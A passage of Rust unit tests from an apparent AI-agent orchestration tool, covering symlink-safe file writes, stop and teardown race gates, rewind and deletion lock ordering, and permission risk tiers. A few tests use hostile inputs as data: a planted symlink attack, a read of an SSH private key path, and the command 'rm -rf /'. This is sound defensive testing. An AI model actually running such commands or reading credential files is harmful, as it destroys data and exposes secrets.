    /// The exact race this fix exists to close: something (a co-resident
    /// process, standing in for an attacker) has ALREADY placed a symlink at
    /// the exact path this function is about to write to, pointing at an
    /// unrelated file elsewhere. `create_new` + `O_NOFOLLOW` must refuse to
    /// write through it — the call must fail closed (return `false`) and the
    /// symlink's target must be left untouched, never overwritten with the
    /// attacker's chosen bytes appearing to have been "written by weft".
    #[cfg(unix)]
    #[test]
    fn write_attachment_no_follow_refuses_a_preexisting_symlink() {
        let tmp = tempfile::tempdir().unwrap();
        let target = tmp.path().join("victim.png");
        std::fs::write(&target, b"original").unwrap();
        let p = tmp.path().join("msg1-0-456.png");
        std::os::unix::fs::symlink(&target, &p).unwrap();

        let ok = write_attachment_no_follow(&p, b"attacker-controlled");
        assert!(!ok, "a pre-placed symlink must make this fail, not follow it");
        assert_eq!(
            std::fs::read(&target).unwrap(),
            b"original",
            "the symlink's target must never be overwritten"
        );
    }

    /// A plain, pre-existing (non-symlink) file at the target path must also
    /// be refused — `create_new` (O_EXCL) is what closes this, distinct from
    /// the symlink case above but the same "never write through something
    /// already there" discipline.
    #[cfg(unix)]
    #[test]
    fn write_attachment_no_follow_refuses_an_existing_regular_file() {
        let tmp = tempfile::tempdir().unwrap();
        let p = tmp.path().join("msg1-0-789.png");
        std::fs::write(&p, b"already here").unwrap();

        let ok = write_attachment_no_follow(&p, b"new bytes");
        assert!(!ok, "an already-existing file must make this fail, not overwrite it");
        assert_eq!(std::fs::read(&p).unwrap(), b"already here");
    }

    // —— hardened write for EVERY OTHER per-turn
    // dialect's predictable-name attachment spill ——

    /// The happy path: a brand-new predictable path writes normally, owner-only.
    #[cfg(unix)]
    #[test]
    fn write_attachment_no_follow_allow_overwrite_writes_a_fresh_path() {
        let tmp = tempfile::tempdir().unwrap();
        let p = tmp.path().join("msg7-0.png");
        assert!(write_attachment_no_follow_allow_overwrite(&p, b"hello"));
        assert_eq!(std::fs::read(&p).unwrap(), b"hello");
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::symlink_metadata(&p).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "must be created owner-only");
    }

    /// The exact vector: a co-resident process
    /// pre-places a symlink at the predictable `msg<row_id>-<i>.<ext>` path,
    /// pointing at an arbitrary file elsewhere. `O_NOFOLLOW` must refuse to
    /// follow it — the call fails closed and the symlink's target is left
    /// untouched, never truncated/overwritten by Weft's own write.
    #[cfg(unix)]
    #[test]
    fn write_attachment_no_follow_allow_overwrite_refuses_a_preexisting_symlink() {
        let tmp = tempfile::tempdir().unwrap();
        let target = tmp.path().join("victim.png");
        std::fs::write(&target, b"original").unwrap();
        let p = tmp.path().join("msg7-0.png");
        std::os::unix::fs::symlink(&target, &p).unwrap();

        let ok = write_attachment_no_follow_allow_overwrite(&p, b"attacker-controlled");
        assert!(!ok, "a pre-placed symlink must make this fail, not follow it");
        assert_eq!(
            std::fs::read(&target).unwrap(),
            b"original",
            "the symlink's target must never be overwritten"
        );
    }

    /// UNLIKE the app-server helper: a plain, pre-existing (non-symlink) file
    /// at the predictable path — standing in for a rewind re-dispatching the
    /// SAME user row a second time — must be OVERWRITTEN, not refused. This is
    /// the deliberate difference from `write_attachment_no_follow`'s own
    /// `create_new` behavior: predictable names must survive replay.
    #[cfg(unix)]
    #[test]
    fn write_attachment_no_follow_allow_overwrite_overwrites_an_existing_regular_file() {
        let tmp = tempfile::tempdir().unwrap();
        let p = tmp.path().join("msg7-0.png");
        std::fs::write(&p, b"already here").unwrap();

        let ok = write_attachment_no_follow_allow_overwrite(&p, b"new bytes");
        assert!(ok, "an ordinary pre-existing file (our own prior write) must be overwritable");
        assert_eq!(std::fs::read(&p).unwrap(), b"new bytes");
    }

    /// Stop must actually stop. `interrupt()` sets `interrupting` without
    /// bumping the epoch, so a Stop landing between `on_turn_end` promoting a
    /// queued item and its dispatch cancels nothing and leaves the epoch
    /// matching — and the queued prompt ran anyway, executing tools, after the
    /// user had pressed Stop.
    #[test]
    fn a_queued_prompt_is_not_dispatched_after_stop() {
        let mut inner = test_inner("omp");
        let epoch = inner.reset_epoch;
        assert!(
            queued_dispatch_admissible(&inner, epoch),
            "baseline: an idle engine dispatches its queue"
        );

        inner.interrupting = true;
        assert!(
            !queued_dispatch_admissible(&inner, epoch),
            "Stop must block the dispatch even though it leaves the epoch alone"
        );

        inner.interrupting = false;
        inner.stopped = true;
        assert!(!queued_dispatch_admissible(&inner, epoch));

        inner.stopped = false;
        inner.tearing_down = true;
        assert!(!queued_dispatch_admissible(&inner, epoch));

        inner.tearing_down = false;
        assert!(
            !queued_dispatch_admissible(&inner, epoch + 1),
            "a reset still invalidates"
        );
        assert!(
            queued_dispatch_admissible(&inner, epoch),
            "and recovers otherwise"
        );
    }

    /// Hidden delivery bypasses `send_reservation_valid` entirely, so the
    /// teardown reservation has to be enforced on its own path — otherwise a
    /// bus wake starts a native session during cleanup and the older reset
    /// clears its id and emits idle over it.
    #[test]
    fn a_hidden_turn_is_refused_while_a_teardown_is_reserved() {
        let mut inner = test_inner("omp");
        assert!(
            hidden_turn_admissible(&inner),
            "baseline: idle engine accepts"
        );

        inner.tearing_down = true;
        assert!(
            !hidden_turn_admissible(&inner),
            "a reserved teardown refuses"
        );

        inner.tearing_down = false;
        inner.stopped = true;
        assert!(!hidden_turn_admissible(&inner), "a stopped engine refuses");

        inner.stopped = false;
        assert!(
            hidden_turn_admissible(&inner),
            "and accepts again afterwards"
        );
    }

    #[test]
    fn durable_hidden_ensure_policy_covers_active_and_stopped_matrix() {
        let mut active = test_inner("claude");
        active.stopped = false;
        assert!(
            should_ensure_active_resident(&active, false, Some(7)),
            "active cold resident hydration must ensure/start before delivery"
        );
        assert!(
            should_ensure_active_resident(&active, true, None),
            "explicit nudge/plan paths still ensure an active resident"
        );

        let mut stopped = test_inner("claude");
        stopped.stopped = true;
        assert!(
            !should_ensure_active_resident(&stopped, false, Some(7)),
            "background repo hydration must not clear or start a stopped lead"
        );
        assert!(
            !should_ensure_active_resident(&stopped, true, None),
            "a stopped generic nudge is refused before ensure"
        );

        // An authorized durable plan clears `stopped` in send_hidden_inner
        // before this policy runs, so it lands in the same active branch.
        stopped.stopped = false;
        assert!(
            should_ensure_active_resident(&stopped, true, Some(8)),
            "explicit plan hydration may revive then ensure the resident"
        );
    }

    #[test]
    fn plan_approval_requires_a_completely_idle_turn_boundary() {
        let mut inner = test_inner("omp");
        assert!(plan_approval_admissible(&inner));

        inner.turn.busy = true;
        assert!(
            !plan_approval_admissible(&inner),
            "an active turn refuses approval"
        );

        inner.turn.busy = false;
        inner.turn.queue.push_back(Outgoing {
            text: "revise the plan first".to_string(),
            ..Default::default()
        });
        assert!(
            !plan_approval_admissible(&inner),
            "queued user intent must run before approval"
        );

        inner.turn.queue.clear();
        inner.turn.bus_read_pos = Some(0);
        assert!(
            !plan_approval_admissible(&inner),
            "a reserved bus wake is already the next turn"
        );

        inner.turn.bus_read_pos = None;
        inner.rewinding = true;
        assert!(
            !plan_approval_admissible(&inner),
            "a native/timeline rewind reservation refuses approval"
        );

        inner.rewinding = false;
        inner.quota_failover_committing = true;
        assert!(
            !plan_approval_admissible(&inner),
            "an engine failover commit refuses approval"
        );
    }

    /// The teardown window's gate. Bumping the epoch stops work reserved
    /// BEFORE a teardown; this stops work admitted DURING one — a send arriving
    /// mid-teardown captures the already-bumped epoch, so the epoch check
    /// cannot see it, and its queued work would be dropped when the reset
    /// replaces `turn` with the default.
    #[test]
    fn a_send_is_refused_while_a_teardown_holds_the_engine_open() {
        let mut inner = test_inner("omp");
        inner.turn_id = 5;
        inner.turn.busy = true;
        let ctx = SendContext {
            thread_id: 1,
            session_id: None,
            turn: 5,
            direct: true,
            is_command: false,
            tool: "omp".into(),
            origin_tag: None,
            reset_epoch: inner.reset_epoch,
        };
        assert!(
            send_reservation_valid(&inner, &ctx),
            "baseline: this send is otherwise admissible"
        );

        inner.tearing_down = true;
        assert!(
            !send_reservation_valid(&inner, &ctx),
            "a teardown that released the lock for ACP I/O must not admit work"
        );

        inner.tearing_down = false;
        assert!(
            send_reservation_valid(&inner, &ctx),
            "and the engine is usable again once the window closes"
        );
    }

    /// The hole this closes, end to end: a read naming an ordinary file FIRST
    /// and a credential second was tiered `ReadOnly` off the first path alone,
    /// and `auto_decision` releases a `ReadOnly` ask under a read-only session
    /// or issue grant (issue #103) — so the SSH key would have been read with
    /// no card ever shown. The tier now comes from the worst target.
    #[test]
    fn a_multi_file_read_is_tiered_by_its_worst_target() {
        use crate::acp::permission::PermissionIntent;

        let ordinary = PermissionIntent::Read {
            paths: vec!["src/main.rs".into()],
        };
        assert_eq!(
            acp_permission_risk(&ordinary, ""),
            crate::ask::RiskLevel::ReadOnly,
            "an ordinary read is still releasable by a read-only grant"
        );

        let with_secret = PermissionIntent::Read {
            paths: vec!["src/main.rs".into(), "/home/u/.ssh/id_rsa".into()],
        };
        assert_eq!(
            acp_permission_risk(&with_secret, ""),
            crate::ask::RiskLevel::NetworkOrCredential,
            "a credential anywhere in the set must lift the whole request"
        );
    }

    /// The two pathless cases differ, and the difference is the whole point.
    /// A write with no named target is still a write. A READ with no named
    /// target established nothing — `classify_file("Read", "")` says
    /// `ReadOnly`, which a read-only grant releases with no card, so a sparse
    /// request hiding its target in `title`/`content` could read a credential
    /// unseen.
    #[test]
    fn a_pathless_read_is_unknown_while_a_pathless_write_stays_write() {
        use crate::acp::permission::PermissionIntent;

        assert_eq!(
            acp_permission_risk(&PermissionIntent::Write { paths: Vec::new() }, ""),
            crate::ask::RiskLevel::Write
        );
        assert_eq!(
            acp_permission_risk(&PermissionIntent::Read { paths: Vec::new() }, ""),
            crate::ask::RiskLevel::Unknown,
            "an unauditable read must not be auto-released as read-only"
        );
    }

    // —— every ACP GUI intent is rejected
    // outright, unconditionally, before any card or grant — superseding
    // rounds 7/9/10's own "GUI intent still goes through auto-decision, just
    // gated by computer::enabled" design entirely ——

    /// `is_gui_intent` recognizes every GUI action regardless of WHICH action
    /// it names — `type` included, closing the exact leak (a native `type`
    /// action's literal keystrokes reaching an IM card)
    /// converges by never letting ANY GUI intent build a card at all.
    #[test]
    fn is_gui_intent_recognizes_every_gui_action() {
        use crate::acp::permission::PermissionIntent;

        for action in ["screenshot", "left_click", "type", "scroll", "key", "some_future_action"] {
            assert!(
                is_gui_intent(&PermissionIntent::Gui { action: action.into() }),
                "GUI action {action:?} must be recognized regardless of which action it names"
            );
        }
    }

    /// Every non-GUI intent variant is unaffected — `is_gui_intent` is a
    /// precise, exhaustive discriminator, never a loose heuristic that could
    /// accidentally also catch an ordinary command/file/network/other
    /// intent.
    #[test]
    fn is_gui_intent_never_matches_a_non_gui_intent() {
        use crate::acp::permission::PermissionIntent;

        assert!(!is_gui_intent(&PermissionIntent::Command("rm -rf /".into())));
        assert!(!is_gui_intent(&PermissionIntent::Read { paths: Vec::new() }));
        assert!(!is_gui_intent(&PermissionIntent::Write { paths: Vec::new() }));
        assert!(!is_gui_intent(&PermissionIntent::Network));
        assert!(!is_gui_intent(&PermissionIntent::Other { kind: "think".into() }));
        // the injected weft_computer MCP intent must
        // NEVER hit the native-GUI rejection — it has its own auto-allow arm.
        assert!(!is_gui_intent(&PermissionIntent::WeftComputerMcp {
            action: "left_click".into()
        }));
    }

    /// the auto-allow
    /// carve-out matches EXACTLY the injected-MCP intent variant — every other
    /// intent (the native Gui one above all) keeps its existing handling.
    #[test]
    fn is_weft_computer_mcp_intent_matches_only_its_own_variant() {
        use crate::acp::permission::PermissionIntent;

        assert!(is_weft_computer_mcp_intent(&PermissionIntent::WeftComputerMcp {
            action: "screenshot".into()
        }));
        assert!(!is_weft_computer_mcp_intent(&PermissionIntent::Gui {
            action: "screenshot".into()
        }));
        assert!(!is_weft_computer_mcp_intent(&PermissionIntent::Command("echo".into())));
        assert!(!is_weft_computer_mcp_intent(&PermissionIntent::Read { paths: Vec::new() }));
        assert!(!is_weft_computer_mcp_intent(&PermissionIntent::Write { paths: Vec::new() }));
        assert!(!is_weft_computer_mcp_intent(&PermissionIntent::Network));
        assert!(!is_weft_computer_mcp_intent(&PermissionIntent::Other { kind: "think".into() }));
    }

    /// An image-only message is addressable in ACP and not in claude, and the
    /// rewind path has exactly one place that decides which rule applies.
    #[test]
    fn the_rewind_ordinal_rule_follows_the_dialect() {
        let texts = vec!["hello".to_string(), String::new()];

        assert_eq!(
            rewind_ordinal("omp", &texts, ""),
            1,
            "ACP writes an empty text block, so the image-only prompt is addressable"
        );
        assert_eq!(
            rewind_ordinal("claude", &texts, ""),
            0,
            "claude's transcript has no line to match, so refuse rather than mis-cut"
        );

        // Ordinary text targets are unaffected by the dialect.
        for tool in ["omp", "claude", "opencode", "codex"] {
            assert_eq!(rewind_ordinal(tool, &texts, "hello"), 1, "{tool}");
        }
    }

    /// The whole point of the helper: a teardown that hands out the ACP client
    /// has ALREADY invalidated the turn. Splitting these leaves a window in
    /// which the engine lock is free, `stopped` is not yet set and the epoch
    /// still matches, so an in-flight prompt task passes its ownership check
    /// and dispatches the next queued prompt into an engine being torn down.
    #[test]
    fn acp_teardown_invalidates_the_turn_in_the_step_that_takes_the_client() {
        let mut inner = test_inner("omp");
        inner.native_id = Some("sess-1".into());
        inner.acp_pending_asks = vec![7, 9];
        let before = inner.reset_epoch;

        let taken = take_acp_teardown_and_invalidate(&mut inner);

        assert_eq!(
            inner.reset_epoch,
            before + 1,
            "the epoch must already be advanced when the lock is released for the ACP awaits"
        );
        assert_eq!(taken.session_id.as_deref(), Some("sess-1"));
        assert_eq!(taken.asks, vec![7, 9]);
        assert!(
            inner.acp_pending_asks.is_empty(),
            "asks move to the caller so they are cancelled exactly once"
        );
    }

    /// The chip shows a tail, so the buffer holds a tail — a turn that reasons
    /// for a megabyte must not park a megabyte on the consumer task.
    #[test]
    fn thought_tail_stays_bounded_across_a_long_reasoning_stream() {
        let mut tail = ThoughtTail::default();
        for _ in 0..1000 {
            tail.push(&"x".repeat(500));
        }

        assert_eq!(
            tail.buf.chars().count(),
            THOUGHT_TAIL_CHARS,
            "buffer must hold the display window, not the whole trace"
        );
        let summary = tail.summary();
        assert!(summary.starts_with('…'), "elided tail keeps its ellipsis");
        assert_eq!(summary.chars().count(), THOUGHT_TAIL_CHARS + 1);
    }

    /// Trimming happens on char boundaries: a tail cut mid-codepoint would
    /// panic on `drain`, and the reasoning stream is routinely non-ASCII.
    #[test]
    fn thought_tail_trims_on_character_boundaries() {
        let mut tail = ThoughtTail::default();
        tail.push(&"思".repeat(THOUGHT_TAIL_CHARS + 40));

        assert_eq!(tail.buf.chars().count(), THOUGHT_TAIL_CHARS);
        assert!(tail.buf.chars().all(|c| c == '思'));
    }

    /// Short reasoning is shown whole — no ellipsis implying dropped text that
    /// was never dropped — and a cleared tail starts clean again.
    #[test]
    fn thought_tail_under_the_window_is_verbatim_and_clears() {
        let mut tail = ThoughtTail::default();
        tail.push("planning the edit");
        assert_eq!(tail.summary(), "planning the edit");

        tail.push(&"y".repeat(THOUGHT_TAIL_CHARS));
        assert!(tail.summary().starts_with('…'));

        tail.clear();
        tail.push("second turn");
        assert_eq!(
            tail.summary(),
            "second turn",
            "clear must drop the elision flag with the text"
        );
    }

    #[tokio::test]
    async fn worker_liveness_requires_an_active_turn() {
        let state = LeadChatState::default();
        let engine: EngineRef = Arc::new(tokio::sync::Mutex::new(test_inner("claude")));
        state.get_or_insert(42, engine.clone());

        assert!(!state.worker_is_running(42));
        engine.lock().await.turn.busy = true;
        assert!(state.worker_is_running(42));
        engine.lock().await.turn.busy = false;
        assert!(!state.worker_is_running(42));
    }

    #[tokio::test]
    async fn delete_admission_waits_for_suspended_constructor_then_removes_its_engine() {
        let state = Arc::new(LeadChatState::default());
        let constructor_guard = state.engine_admission_read().await;
        let delete_state = state.clone();
        let mut delete = tokio::spawn(async move {
            let _delete_guard = delete_state.engine_admission_write().await;
            delete_state.remove(42).is_some()
        });
        tokio::task::yield_now().await;
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(20), &mut delete)
                .await
                .is_err(),
            "delete must wait while a constructor can still publish its engine"
        );

        let engine: EngineRef = Arc::new(tokio::sync::Mutex::new(test_inner("claude")));
        state.get_or_insert(42, engine);
        drop(constructor_guard);

        assert!(
            delete.await.unwrap(),
            "post-commit stop sees the newly inserted key"
        );
        assert!(state.get(42).is_none());
    }

    struct RewindDeletionFixture {
        db: Db,
        bus: crate::bus::BusRegistry,
        state: Arc<LeadChatState>,
        engine: EngineRef,
        thread_id: i32,
        session_id: i32,
        direction_scope: String,
        primary_repo_id: i32,
        session_repo_id: i32,
    }

    async fn rewind_deletion_fixture() -> RewindDeletionFixture {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let workspace = repo::create_workspace(&db, "rewind-delete")
            .await
            .unwrap();
        let primary = repo::add_repo_ref(
            &db,
            workspace.id,
            "primary",
            "/tmp/rewind-delete-primary",
            "main",
            "",
            true,
        )
        .await
        .unwrap();
        let secondary = repo::add_repo_ref(
            &db,
            workspace.id,
            "secondary",
            "/tmp/rewind-delete-secondary",
            "main",
            "",
            true,
        )
        .await
        .unwrap();
        let thread = repo::create_thread(
            &db,
            workspace.id,
            "issue",
            "feature/rewind-delete",
            "codex",
        )
        .await
        .unwrap();
        let direction = repo::create_direction(
            &db,
            thread.id,
            "implementation",
            "codex",
            primary.id,
            "why",
            "impl-only",
            "",
        )
        .await
        .unwrap();
        let session = repo::create_session(
            &db,
            direction.id,
            secondary.id,
            "codex",
            "/tmp/rewind-delete-secondary-wt",
        )
        .await
        .unwrap();
        let mut inner = test_inner("codex");
        inner.thread_id = thread.id;
        inner.session_id = Some(session.id);
        inner.ask_dir = direction.id.to_string();
        inner.cwd = session.cwd.clone().into();
        let engine: EngineRef = Arc::new(tokio::sync::Mutex::new(inner));
        let state = Arc::new(LeadChatState::default());
        state.get_or_insert(session.id as i64, engine.clone());

        RewindDeletionFixture {
            db,
            bus: crate::bus::BusRegistry::new(),
            state,
            engine,
            thread_id: thread.id,
            session_id: session.id,
            direction_scope: direction.id.to_string(),
            primary_repo_id: primary.id,
            session_repo_id: secondary.id,
        }
    }

    /// A worker on secondary repo B still depends on its direction's primary
    /// repo A. Every engine entry point shares this admission helper, so A's
    /// marker must stop reconstruction/ensure, native spawn, and hidden input
    /// before their respective side-effect sinks; clearing the marker restores
    /// all three without rebuilding the fixture.
    #[tokio::test]
    async fn primary_repo_marker_fences_worker_admission_and_clear_recovers() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let fixture = rewind_deletion_fixture().await;
        let ensure_sink = AtomicUsize::new(0);
        let spawn_sink = AtomicUsize::new(0);
        let hidden_sink = AtomicUsize::new(0);

        repo::mark_repo_deleting(&fixture.db, fixture.primary_repo_id)
            .await
            .unwrap();
        if ensure_worker_parent_chain(
            &fixture.db,
            fixture.direction_scope.parse().unwrap(),
            fixture.session_repo_id,
        )
        .await
        .is_ok()
        {
            ensure_sink.fetch_add(1, Ordering::SeqCst);
        }
        for sink in [&spawn_sink, &hidden_sink] {
            if validate_registered_engine_identity(
                Some(fixture.state.as_ref()),
                &fixture.db,
                &fixture.engine,
                fixture.thread_id,
                Some(fixture.session_id),
                &fixture.direction_scope,
            )
            .await
            .is_ok()
            {
                sink.fetch_add(1, Ordering::SeqCst);
            }
        }
        assert_eq!(ensure_sink.load(Ordering::SeqCst), 0);
        assert_eq!(spawn_sink.load(Ordering::SeqCst), 0);
        assert_eq!(hidden_sink.load(Ordering::SeqCst), 0);

        repo::clear_repo_deleting(&fixture.db, fixture.primary_repo_id)
            .await
            .unwrap();
        if ensure_worker_parent_chain(
            &fixture.db,
            fixture.direction_scope.parse().unwrap(),
            fixture.session_repo_id,
        )
        .await
        .is_ok()
        {
            ensure_sink.fetch_add(1, Ordering::SeqCst);
        }
        for sink in [&spawn_sink, &hidden_sink] {
            if validate_registered_engine_identity(
                Some(fixture.state.as_ref()),
                &fixture.db,
                &fixture.engine,
                fixture.thread_id,
                Some(fixture.session_id),
                &fixture.direction_scope,
            )
            .await
            .is_ok()
            {
                sink.fetch_add(1, Ordering::SeqCst);
            }
        }
        assert_eq!(ensure_sink.load(Ordering::SeqCst), 1);
        assert_eq!(spawn_sink.load(Ordering::SeqCst), 1);
        assert_eq!(hidden_sink.load(Ordering::SeqCst), 1);
    }

    /// A durable deletion fence must reject the stale registered engine before
    /// the operation future is entered. Cover both repositories in a worker's
    /// parent chain, then the committed-delete form where the session is gone.
    #[tokio::test]
    async fn deletion_marker_or_commit_wins_before_rewind_and_runs_no_side_effects() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let fixture = rewind_deletion_fixture().await;
        let fork_runs = Arc::new(AtomicUsize::new(0));
        let restore_runs = Arc::new(AtomicUsize::new(0));

        for repo_id in [fixture.primary_repo_id, fixture.session_repo_id] {
            repo::mark_repo_deleting(&fixture.db, repo_id)
                .await
                .unwrap();
            fixture.engine.lock().await.rewinding = true;
            let fork_counter = fork_runs.clone();
            let restore_counter = restore_runs.clone();
            let result = run_rewind_reserved_under_lifecycle(
                &fixture.bus,
                fixture.state.as_ref(),
                &fixture.db,
                &fixture.engine,
                fixture.thread_id,
                Some(fixture.session_id),
                &fixture.direction_scope,
                move || async move {
                    fork_counter.fetch_add(1, Ordering::SeqCst);
                    restore_counter.fetch_add(1, Ordering::SeqCst);
                    Ok::<(), anyhow::Error>(())
                },
            )
            .await;
            assert!(result.is_err(), "repo deletion marker must fence rewind");
            assert!(!fixture.engine.lock().await.rewinding);
            repo::clear_repo_deleting(&fixture.db, repo_id)
                .await
                .unwrap();
        }

        repo::delete_repo_cascade(&fixture.db, fixture.session_repo_id)
            .await
            .unwrap();
        fixture.engine.lock().await.rewinding = true;
        let fork_counter = fork_runs.clone();
        let restore_counter = restore_runs.clone();
        let result = run_rewind_reserved_under_lifecycle(
            &fixture.bus,
            fixture.state.as_ref(),
            &fixture.db,
            &fixture.engine,
            fixture.thread_id,
            Some(fixture.session_id),
            &fixture.direction_scope,
            move || async move {
                fork_counter.fetch_add(1, Ordering::SeqCst);
                restore_counter.fetch_add(1, Ordering::SeqCst);
                Ok::<(), anyhow::Error>(())
            },
        )
        .await;
        assert!(result.is_err(), "committed deletion must fence stale rewind");
        assert_eq!(fork_runs.load(Ordering::SeqCst), 0);
        assert_eq!(restore_runs.load(Ordering::SeqCst), 0);
        assert!(!fixture.engine.lock().await.rewinding);
    }

    /// Once rewind has passed admission, deletion may publish its marker but
    /// must wait at the shared lifecycle gate until the complete rewind body
    /// and reservation clear have both finished.
    #[tokio::test]
    async fn rewind_that_wins_lifecycle_finishes_before_thread_deletion() {
        use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

        let fixture = rewind_deletion_fixture().await;
        fixture.engine.lock().await.rewinding = true;
        let fork_runs = Arc::new(AtomicUsize::new(0));
        let restore_runs = Arc::new(AtomicUsize::new(0));
        let rewind_complete = Arc::new(AtomicBool::new(false));
        let (admitted_tx, admitted_rx) = tokio::sync::oneshot::channel();
        let (finish_tx, finish_rx) = tokio::sync::oneshot::channel();

        let rewind_db = fixture.db.clone();
        let rewind_bus = fixture.bus.clone();
        let rewind_state = fixture.state.clone();
        let rewind_engine = fixture.engine.clone();
        let rewind_direction = fixture.direction_scope.clone();
        let fork_counter = fork_runs.clone();
        let restore_counter = restore_runs.clone();
        let completed = rewind_complete.clone();
        let thread_id = fixture.thread_id;
        let session_id = fixture.session_id;
        let rewind_task = tokio::spawn(async move {
            run_rewind_reserved_under_lifecycle(
                &rewind_bus,
                rewind_state.as_ref(),
                &rewind_db,
                &rewind_engine,
                thread_id,
                Some(session_id),
                &rewind_direction,
                move || async move {
                    let _ = admitted_tx.send(());
                    finish_rx
                        .await
                        .map_err(|_| anyhow::anyhow!("test rewind release dropped"))?;
                    fork_counter.fetch_add(1, Ordering::SeqCst);
                    restore_counter.fetch_add(1, Ordering::SeqCst);
                    completed.store(true, Ordering::Release);
                    Ok::<(), anyhow::Error>(())
                },
            )
            .await
        });
        admitted_rx.await.unwrap();

        let delete_db = fixture.db.clone();
        let delete_bus = fixture.bus.clone();
        let delete_state = fixture.state.clone();
        let delete_complete = rewind_complete.clone();
        let (waiting_tx, waiting_rx) = tokio::sync::oneshot::channel();
        let mut delete_task = tokio::spawn(async move {
            repo::mark_thread_deleting(&delete_db, thread_id)
                .await
                .unwrap();
            let _engine_admission = delete_state.engine_admission_write().await;
            let _ = waiting_tx.send(());
            let lifecycle = delete_bus.thread_lifecycle_gate(thread_id);
            let _lifecycle = lifecycle.lock_owned().await;
            let saw_completed_rewind = delete_complete.load(Ordering::Acquire);
            repo::delete_thread_cascade_with_human_cancellations(&delete_db, thread_id)
                .await
                .unwrap();
            delete_state.remove(session_id as i64);
            saw_completed_rewind
        });
        waiting_rx.await.unwrap();

        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(30), &mut delete_task)
                .await
                .is_err(),
            "deletion must wait while rewind owns the lifecycle gate"
        );
        assert!(repo::get_thread(&fixture.db, fixture.thread_id)
            .await
            .unwrap()
            .is_some());

        finish_tx.send(()).unwrap();
        rewind_task.await.unwrap().unwrap();
        assert!(!fixture.engine.lock().await.rewinding);
        assert!(
            delete_task.await.unwrap(),
            "deletion may acquire the gate only after rewind completed"
        );
        assert_eq!(fork_runs.load(Ordering::SeqCst), 1);
        assert_eq!(restore_runs.load(Ordering::SeqCst), 1);
        assert!(repo::get_thread(&fixture.db, fixture.thread_id)
            .await
            .unwrap()
            .is_none());
    }

    /// The production three-way lock order is surface -> lifecycle for rewind,
    /// surface -> global-read for sends, and global-write -> lifecycle for
    /// deletion (deletion never acquires a surface gate). Hold a real rewind
    /// admission through its operation, then interleave send/delete: delete
    /// may publish its write fence but waits on lifecycle, while send waits on
    /// surface. Releasing rewind must let all three finish without a cycle or
    /// leaked guard.
    #[tokio::test]
    async fn rewind_surface_lifecycle_global_barrier_has_no_three_lock_cycle() {
        let fixture = rewind_deletion_fixture().await;
        let key = fixture.session_id as i64;
        fixture.engine.lock().await.rewinding = true;

        let (rewind_admitted_tx, rewind_admitted_rx) = tokio::sync::oneshot::channel();
        let (rewind_release_tx, rewind_release_rx) = tokio::sync::oneshot::channel();
        let rewind_bus = fixture.bus.clone();
        let rewind_state = fixture.state.clone();
        let rewind_db = fixture.db.clone();
        let rewind_engine = fixture.engine.clone();
        let rewind_direction = fixture.direction_scope.clone();
        let thread_id = fixture.thread_id;
        let session_id = fixture.session_id;
        let rewind_task = tokio::spawn(async move {
            run_rewind_reserved_under_lifecycle(
                &rewind_bus,
                rewind_state.as_ref(),
                &rewind_db,
                &rewind_engine,
                thread_id,
                Some(session_id),
                &rewind_direction,
                move || async move {
                    let _ = rewind_admitted_tx.send(());
                    rewind_release_rx
                        .await
                        .map_err(|_| anyhow::anyhow!("test rewind release dropped"))?;
                    Ok::<(), anyhow::Error>(())
                },
            )
            .await
        });
        tokio::time::timeout(std::time::Duration::from_secs(1), rewind_admitted_rx)
            .await
            .expect("rewind should acquire surface then lifecycle")
            .expect("rewind admission signal should remain connected");

        let (send_done_tx, mut send_done_rx) = tokio::sync::oneshot::channel();
        let send_state = fixture.state.clone();
        let send_task = tokio::spawn(async move {
            let _surface = admission_gate_for_key(key).lock_owned().await;
            let _read = send_state.engine_admission_read().await;
            let _ = send_done_tx.send(());
        });

        let (delete_write_tx, mut delete_write_rx) = tokio::sync::oneshot::channel();
        let (delete_lifecycle_tx, mut delete_lifecycle_rx) = tokio::sync::oneshot::channel();
        let delete_state = fixture.state.clone();
        let delete_bus = fixture.bus.clone();
        let delete_db = fixture.db.clone();
        let delete_task = tokio::spawn(async move {
            repo::mark_thread_deleting(&delete_db, thread_id)
                .await
                .unwrap();
            let _write = delete_state.engine_admission_write().await;
            let _ = delete_write_tx.send(());
            let _lifecycle = delete_bus
                .thread_lifecycle_gate(thread_id)
                .lock_owned()
                .await;
            let _ = delete_lifecycle_tx.send(());
        });

        tokio::time::timeout(std::time::Duration::from_secs(1), &mut delete_write_rx)
            .await
            .expect("delete should acquire global write before lifecycle")
            .expect("delete write signal should remain connected");
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(100), &mut delete_lifecycle_rx)
                .await
                .is_err(),
            "delete must wait on rewind's lifecycle gate"
        );
        assert!(
            tokio::time::timeout(std::time::Duration::from_millis(100), &mut send_done_rx)
                .await
                .is_err(),
            "send must wait on rewind's surface gate"
        );

        rewind_release_tx.send(()).unwrap();
        rewind_task.await.unwrap().unwrap();
        tokio::time::timeout(std::time::Duration::from_secs(1), delete_lifecycle_rx)
            .await
            .expect("delete should acquire lifecycle after rewind")
            .expect("delete lifecycle signal should remain connected");
        tokio::time::timeout(std::time::Duration::from_secs(1), send_done_rx)
            .await
            .expect("send should acquire surface and global read after delete")
            .expect("send completion signal should remain connected");
        delete_task.await.unwrap();
        send_task.await.unwrap();

        assert!(!fixture.engine.lock().await.rewinding);
        let _surface = tokio::time::timeout(
            std::time::Duration::from_secs(1),
            admission_gate_for_key(key).lock_owned(),
        )
        .await
        .expect("rewind surface gate must be released");
        let _read = tokio::time::timeout(
            std::time::Duration::from_secs(1),
            fixture.state.engine_admission_read(),
        )
        .await
        .expect("send read guard must be released");
        drop(_read);
        let _write = tokio::time::timeout(
            std::time::Duration::from_secs(1),
            fixture.state.engine_admission_write(),
        )
        .await
        .expect("delete write guard must be released");
        drop(_write);
        let _lifecycle = tokio::time::timeout(
            std::time::Duration::from_secs(1),
            fixture.bus.thread_lifecycle_gate(thread_id).lock_owned(),
        )
        .await
        .expect("rewind/delete lifecycle gate must be released");
    }

    // ---- issue #99: sub-agent branch attribution (branch_of / text_row_content) ----

    #[test]
    fn branch_of_normalizes_own_thread_to_mainline() {
        // The session's own thread id — main narration — is NOT a branch, even
